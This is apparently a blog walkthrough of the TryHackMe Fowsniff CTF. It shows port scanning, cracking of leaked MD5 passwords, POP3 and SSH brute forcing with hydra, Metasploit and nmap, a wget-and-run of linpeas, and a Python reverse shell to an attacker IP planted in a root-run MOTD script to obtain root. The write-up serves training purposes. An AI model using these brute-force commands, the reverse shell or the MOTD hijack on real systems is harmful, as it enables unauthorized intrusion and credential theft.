---
title: "Fowsniff CTF"
date: 2025-06-17 01:09:33 +0300
author: oste
description: This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research, decoding hashes, brute forcing a pop3 login and much more!
image: /assets/img/Posts/Fowsniff CTF.png
categories: [Tryhackme, Easy]
tags:
  [hydra, fowsniff, thm, md5]
---

## Brief

This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

Credit to [berzerk0](https://twitter.com/berzerk0) for creating this machine.

## Questions

### Using nmap, scan this machine. What ports are open?

After doing a full pot scan, you will identify 4 ports are open: 22,80,110 & 143

```bash
➜  sudo nmap -sCV -T4 -p- -A -O 10.10.92.38 -v -oA nmap-results

Nmap scan report for 10.10.92.38
Host is up (0.15s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: PIPELINING SASL(PLAIN) AUTH-RESP-CODE RESP-CODES TOP UIDL USER CAPA
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: LITERAL+ AUTH=PLAINA0001 Pre-login have SASL-IR post-login listed more ENABLE LOGIN-REFERRALS IMAP4rev1 OK ID IDLE capabilities
```
{: .nolineno }

### Using the information from the open ports. Look around. What can you find?

Exploring the webpage, we get some information about Fowsniff Corp

![image](https://gist.github.com/user-attachments/assets/3e527f3b-d1b2-4cfe-a01a-993cd20e2f86)


I tried running nuclei on it to see if I could get anything interesting but got nothing of interest.

```bash
➜  nuclei -u http://10.10.92.38/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

		projectdiscovery.io

[INF] Current nuclei version: v3.3.8 (outdated)
[INF] Current nuclei-templates version: v10.2.3 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 105
[INF] Templates loaded for current scan: 8123
[INF] Executing 7921 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 202 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1759 (Reduced 1654 Requests)
[INF] Using Interactsh Server: oast.pro
[waf-detect:apachegeneric] [http] [info] http://10.10.92.38/
[ssh-auth-methods] [javascript] [info] 10.10.92.38:22 ["["publickey","password"]"]
[CVE-2023-48795] [javascript] [medium] 10.10.92.38:22 ["Vulnerable to Terrapin"]
[ssh-sha1-hmac-algo] [javascript] [info] 10.10.92.38:22
[ssh-password-auth] [javascript] [info] 10.10.92.38:22
[ssh-server-enumeration] [javascript] [info] 10.10.92.38:22 ["SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4"]
[robots-txt-endpoint] [http] [info] http://10.10.92.38/robots.txt
[apache-detect] [http] [info] http://10.10.92.38/ ["Apache/2.4.18 (Ubuntu)"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://10.10.92.38/
[http-missing-security-headers:permissions-policy] [http] [info] http://10.10.92.38/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.10.92.38/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://10.10.92.38/
[http-missing-security-headers:content-security-policy] [http] [info] http://10.10.92.38/
[http-missing-security-headers:x-frame-options] [http] [info] http://10.10.92.38/
[http-missing-security-headers:x-content-type-options] [http] [info] http://10.10.92.38/
[http-missing-security-headers:referrer-policy] [http] [info] http://10.10.92.38/
[http-missing-security-headers:clear-site-data] [http] [info] http://10.10.92.38/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.10.92.38/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.10.92.38/
[options-method] [http] [info] http://10.10.92.38/ ["GET,HEAD,POST,OPTIONS"]
```
{: .nolineno }


I then tried to bruteforce the web application to try identify hidden directories or secret files that might have been left behind but couldn't find anything useful as well.


```bash
➜  feroxbuster -u http://10.10.92.38/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.92.38/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      313c http://10.10.92.38/images => http://10.10.92.38/images/
200      GET        2l      138w     9085c http://10.10.92.38/assets/js/skel.min.js
200      GET        8l       71w     2380c http://10.10.92.38/assets/js/ie/html5shiv.js
200      GET        2l       39w     5106c http://10.10.92.38/assets/js/jquery.dropotron.min.js
200      GET       96l      198w     2086c http://10.10.92.38/assets/js/main.js
200      GET        2l       19w     1177c http://10.10.92.38/assets/js/skel-viewport.min.js
200      GET       57l      105w      977c http://10.10.92.38/assets/css/ie8.css
200      GET      587l     1232w    12433c http://10.10.92.38/assets/js/util.js
200      GET     2690l     5444w    45678c http://10.10.92.38/assets/css/main.css
200      GET        6l       71w     4591c http://10.10.92.38/assets/js/ie/respond.min.js
200      GET        7l       47w     3810c http://10.10.92.38/assets/js/ie/backgroundsize.min.htc
200      GET      245l     1311w    88273c http://10.10.92.38/images/pic01.jpg
200      GET      131l      912w    42862c http://10.10.92.38/images/img1.jpg
200      GET        4l       66w    29063c http://10.10.92.38/assets/css/font-awesome.min.css
200      GET        5l     1413w    95957c http://10.10.92.38/assets/js/jquery.min.js
200      GET       76l      240w     2629c http://10.10.92.38/
200      GET       68l      113w     1053c http://10.10.92.38/assets/sass/ie8.scss
200      GET        3l       15w      811c http://10.10.92.38/assets/css/images/shadow.png
200      GET       96l      740w    41041c http://10.10.92.38/assets/js/ie/PIE.htc
301      GET        9l       28w      313c http://10.10.92.38/assets => http://10.10.92.38/assets/
200      GET     1649l     2950w    24872c http://10.10.92.38/assets/sass/main.scss
200      GET      114l      674w    51388c http://10.10.92.38/assets/css/images/overlay.png
200      GET       34l      105w      787c http://10.10.92.38/assets/sass/libs/_functions.scss
200      GET       22l       31w      210c http://10.10.92.38/assets/sass/libs/_vars.scss
200      GET      398l     1041w     9329c http://10.10.92.38/assets/sass/libs/_mixins.scss
200      GET      280l     2512w   279848c http://10.10.92.38/images/banner.jpg
200      GET      310l     2069w   163622c http://10.10.92.38/assets/fonts/fontawesome-webfont.woff
200      GET      587l     1653w    16511c http://10.10.92.38/assets/sass/libs/_skel.scss
200      GET      390l     2094w   135959c http://10.10.92.38/assets/fonts/fontawesome-webfont.eot
200      GET      260l     1635w   130134c http://10.10.92.38/assets/fonts/fontawesome-webfont.woff2
200      GET     2588l     4636w   239531c http://10.10.92.38/assets/fonts/FontAwesome.otf
200      GET     1304l     5478w   196149c http://10.10.92.38/assets/fonts/fontawesome-webfont.ttf
200      GET      685l    57230w   391622c http://10.10.92.38/assets/fonts/fontawesome-webfont.svg
[####################] - 13m   220609/220609  0s      found:33      errors:35
[####################] - 13m   220545/220545  292/s   http://10.10.92.38/
[####################] - 1s    220545/220545  163367/s http://10.10.92.38/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    220545/220545  260384/s http://10.10.92.38/assets/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    220545/220545  646760/s http://10.10.92.38/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    220545/220545  318247/s http://10.10.92.38/assets/js/ie/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    220545/220545  329172/s http://10.10.92.38/assets/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    220545/220545  561183/s http://10.10.92.38/assets/sass/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    220545/220545  159238/s http://10.10.92.38/assets/fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s    220545/220545  426586/s http://10.10.92.38/assets/css/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    220545/220545  467256/s http://10.10.92.38/assets/sass/libs/ => Directory listing (add --scan-dir-listings to scan)                                                                                     ➜  Fowsniff-CTF
```
{: .nolineno }


### Using Google, can you find any public information about them?

From the companies website, we learn that their [X](https://x.com/fowsniffcorp) (formely twitter) account had been pwned. So i checked it out to see if any credentials or hashes had been leaked as mentioned. Indeed the account was pwned as shown:

![image](https://gist.github.com/user-attachments/assets/d1186ebd-581b-4b18-8d5e-55dfd5c4d930)
![image](https://gist.github.com/user-attachments/assets/1b8dd865-8284-42f1-8870-4b98b90c8f6b)
![image](https://gist.github.com/user-attachments/assets/1b40be3b-ca5e-4af5-8505-455fa60ed151)

I got two pastebin URLs that potentially contain all passwords leaked.

```bash
https://pastebin.com/378rLnGi
https://pastebin.com/NrAqVeeX
```

> At the moment of writing this blog, the pastes had already been taken down. However,using [Wayback machine](https://web.archive.org/web/20230502123103/pastebin.com/378rLnGi), you can easily view the contents
> You can get the original contents [here](https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt) or [here](https://web.archive.org/web/20200920053052/https://pastebin.com/NrAqVeeX)
{: .prompt-info }

Here, we get 9 email passwords dumped from their databases.

![image](https://gist.github.com/user-attachments/assets/0c934883-afcf-48e0-8de4-43092ff68fef)


### Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.

Password hashes:

```bash
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```
{: .nolineno }


![image](https://gist.github.com/user-attachments/assets/d46d4d43-8eaf-4d6a-9a0b-6dd1cb031b08)

![image](https://gist.github.com/user-attachments/assets/21882463-3ece-428e-b656-9d560555042c)

After cracking all 9 hashes, only 1 seemed not to have cracked successfully for the user `stone`

```bash
mauer    — 8a28a94a588a95b80163709ab4313aa4 — mailcall
mustikka — ae1644dac5b77c0cf51e0d26ad6d7e56 — bilbo101
tegel    — 1dc352435fecca338acfd4be10984009 — apples01
baksteen — 19f5af754c31f1e2651edde9250d69bb — skyler22
seina    — 90dc16d47114aa13671c697fd506cf26 — scoobydoo2
stone    — a92b8a29ef1183192e3d35187e0cfabd — ??????
mursten  — 0e9588cb62f4b6f27e33d449e2ba0b3b — carp4ever
parede   — 4d6e42f56e127803285a0a7649b5ab11 — orlando12
sciana   — f7fd98d380735e859f8b2ffbbede5a7e — 07011972
```
{: .nolineno }

### Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?

### What was seina's password to the email service?

Usernames:

```bash
mauer
mustikka
tegel
baksteen
seina
stone
mursten
parede
sciana
```
{: .nolineno }

Passwords:

```bash
mailcall
bilbo101
apples01
skyler22
scoobydoo2
carp4ever
orlando12
07011972
```
{: .nolineno }

#### Using Metasploit:

```bash
➜  nano usernames.txt
➜  nano passwords.txt
➜  msfconsole -q
msf6 > search pop3

<< REDACTED >>

msf6 > use 3
msf6 auxiliary(scanner/pop3/pop3_login) > options

<< REDACTED >>

msf6 auxiliary(scanner/pop3/pop3_login) > set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set USERNAME seina
USERNAME => seina
msf6 auxiliary(scanner/pop3/pop3_login) > set RHOSTS 10.10.148.76
RHOSTS => 10.10.148.76
msf6 auxiliary(scanner/pop3/pop3_login) > run
```
{: .nolineno }


#### Using Nmap

```bash
➜  nmap -p 110 --script pop3-brute --script-args userdb=usernames.txt,passdb=passwords.txt 10.10.148.76
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 23:05 EAT
Nmap scan report for 10.10.148.76
Host is up (0.16s latency).

PORT    STATE SERVICE
110/tcp open  pop3
| pop3-brute:
|   Accounts:
|     seina:scoobydoo2 - Valid credentials
|_  Statistics: Performed 79 guesses in 105 seconds, average tps: 0.5

Nmap done: 1 IP address (1 host up) scanned in 111.70 seconds
```
{: .nolineno }


#### Using Hydra:

```bash
➜  hydra -L usernames.txt -P passwords.txt -f 10.10.148.76 pop3 -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-17 23:06:51
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 72 login tries (l:9/p:8), ~5 tries per task
[DATA] attacking pop3://10.10.148.76:110/

<< REDACTED >>

[110][pop3] host: 10.10.148.76   login: seina   password: scoobydoo2
[STATUS] attack finished for 10.10.148.76 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-17 23:07:43
```
{: .nolineno }


### Can you connect to the pop3 service with her credentials? What email information can you gather?

### Looking through her emails, what was a temporary password set for her?

```bash
➜  telnet 10.10.148.76 110
Trying 10.10.148.76...
Connected to 10.10.148.76.
Escape character is '^]'.
+OK Welcome to the Fowsniff Corporate Mail Server!
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
	id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
RETR 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
	id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup.
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password.
AJ had been telling us to do that right before Captain Profanity showed up.
```
{: .nolineno }

`S1ck3nBluff+secureshell`

In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.

```bash
➜  hydra -L usernames.txt -p "S1ck3nBluff+secureshell" ssh://10.10.148.76
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-17 23:27:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
[DATA] attacking ssh://10.10.148.76:22/
[22][ssh] host: 10.10.148.76   login: baksteen   password: S1ck3nBluff+secureshell
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-17 23:27:40
```
{: .nolineno }


### Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?

```bash
➜  ssh baksteen@10.10.148.76
The authenticity of host '10.10.148.76 (10.10.148.76)' can't be established.
ED25519 key fingerprint is SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.148.76' (ED25519) to the list of known hosts.
baksteen@10.10.148.76's password:

                            _____                       _  __  __
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|
-:      y.      dssssssso                ____
-:      y.      dssssssso               / ___|___  _ __ _ __
-:      y.      dssssssso              | |   / _ \| '__| '_ \
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _
-:      o.      yssssssso               \____\___/|_|  | .__/  (_)
-:    .+mdddddddmyyyyyhy:                              |_|
-: -odMMMMMMMMMMmhhdy/.
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! ****

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ ls -la
total 40
drwxrwx---  4 baksteen baksteen 4096 Mar 13  2018 .
drwxr-xr-x 11 root     root     4096 Mar  8  2018 ..
-rw-------  1 baksteen users       1 Mar 13  2018 .bash_history
-rw-r--r--  1 baksteen users     220 Aug 31  2015 .bash_logout
-rw-r--r--  1 baksteen users    3771 Aug 31  2015 .bashrc
drwx------  2 baksteen users    4096 Mar  8  2018 .cache
-rw-r--r--  1 baksteen users       0 Mar  9  2018 .lesshsQ
drwx------  5 baksteen users    4096 Mar  9  2018 Maildir
-rw-r--r--  1 baksteen users     655 May 16  2017 .profile
-rw-r--r--  1 baksteen users      97 Mar  9  2018 term.txt
-rw-------  1 baksteen users    2981 Mar 13  2018 .viminfo
baksteen@fowsniff:~$ cat term.txt
I wonder if the person who coined the term "One Hit Wonder"
came up with another other phrases.
```
{: .nolineno }


I proceeded to upload linepeas on the victim machine for quick eneumeration.

On the attacker machine, start a python server:

```bash
➜  python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.148.76 - - [17/Jun/2025 23:33:49] "GET /linpeas.sh HTTP/1.1" 200 -
```
{: .nolineno }


On the victim machine, download linpeas.sh, give it appropriate permissions and execute it. (_I prefer to save the output and download it locally incase i need to reference it later_)

```bash
baksteen@fowsniff:/tmp$ wget 10.9.3.131:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh -a > linpeas.txt
```
{: .nolineno }

Start a local python server on the victim machine so as to download the output locally.

```bash
baksteen@fowsniff:/tmp$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 ...
10.9.3.131 - - [17/Jun/2025 16:36:24] "GET /linpeas.txt HTTP/1.1" 200 -
```
{: .nolineno }


Download the file on the attacker machine and inspect it:

```bash
➜  wget 10.10.148.76:8080/linpeas.txt
--2025-06-17 23:36:23--  http://10.10.148.76:8080/linpeas.txt
Connecting to 10.10.148.76:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 145057 (142K) [text/plain]
Saving to: ‘linpeas.txt’

linpeas.txt                 100%[===========================================>] 141.66K  96.1KB/s    in 1.5s

2025-06-17 23:36:25 (96.1 KB/s) - ‘linpeas.txt’ saved [145057/145057]

➜  less -r linpeas.txt
```
{: .nolineno }


### Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

Here, I identified that an interesting script `/opt/cube/cube.sh` which belongs to `parede` and also owned by the users `group`

```bash
baksteen@fowsniff:~$ cd /opt/cube/
baksteen@fowsniff:/opt/cube$ ls -la
total 12
drwxrwxrwx 2 root   root  4096 Jun 17 17:00 .
drwxr-xr-x 6 root   root  4096 Mar 11  2018 ..
-rw-rwxr-- 1 parede users  226 Jun 17 17:00 cube.sh
```
{: .nolineno }

Inspecting the content, I got:

```bash
placeholder
```
{: .nolineno }


This resembles the `motd` reflected upon login. So i decided the inspect the `motd`

```bash
baksteen@fowsniff:~$ cd /etc/update-motd.d/
baksteen@fowsniff:/etc/update-motd.d$ ls -la
total 24
drwxr-xr-x  2 root root 4096 Mar 11  2018 .
drwxr-xr-x 87 root root 4096 Dec  9  2018 ..
-rwxr-xr-x  1 root root 1248 Mar 11  2018 00-header
-rwxr-xr-x  1 root root 1473 Mar  9  2018 10-help-text
-rwxr-xr-x  1 root root  299 Jul 22  2016 91-release-upgrade
-rwxr-xr-x  1 root root  604 Nov  5  2017 99-esm
baksteen@fowsniff:/etc/update-motd.d$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

#[ -r /etc/lsb-release ] && . /etc/lsb-release

#if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
#	# Fall back to using the very slow lsb_release utility
#	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
#fi

#printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"

sh /opt/cube/cube.sh
```
{: .nolineno }

Here, I noted that `00-header` is run by root and it executes `/opt/cube/cube.sh`. If you the add a reverse shell in the `cube.sh` file, it will run as root and we will get a reverse shell as root if we re-login. In my case, I used the following reverse shell.


```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.3.131",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
{: .nolineno }


```bash
baksteen@fowsniff:/opt/cube$ nano cube.sh
baksteen@fowsniff:/opt/cube$ cat /opt/cube/cube.sh

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.3.131",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
baksteen@fowsniff:/opt/cube$ 
```
{: .nolineno }

Start a nc listener in a different tab and log in again. This time round, you get a shell as user root:

```bash
➜  nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.9.3.131] from (UNKNOWN) [10.10.92.38] 38686
root@fowsniff:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@fowsniff:/# pwd
pwd
/
root@fowsniff:/# cd /root
cd /root
root@fowsniff:/root# ls -la
ls -la
total 28
drwx------  4 root root 4096 Mar  9  2018 .
drwxr-xr-x 22 root root 4096 Mar  9  2018 ..
-rw-r--r--  1 root root 3117 Mar  9  2018 .bashrc
drwxr-xr-x  2 root root 4096 Mar  9  2018 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  5 root root 4096 Mar  9  2018 Maildir
-rw-r--r--  1 root root  582 Mar  9  2018 flag.txt
root@fowsniff:/root# cat flag.txt
cat flag.txt
   ___                        _        _      _   _             _
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!

This CTF was built with love in every byte by @berzerk0 on Twitter.

Special thanks to psf, @nbulischeck and the whole Fofao Team.

root@fowsniff:/root#
```
{: .nolineno }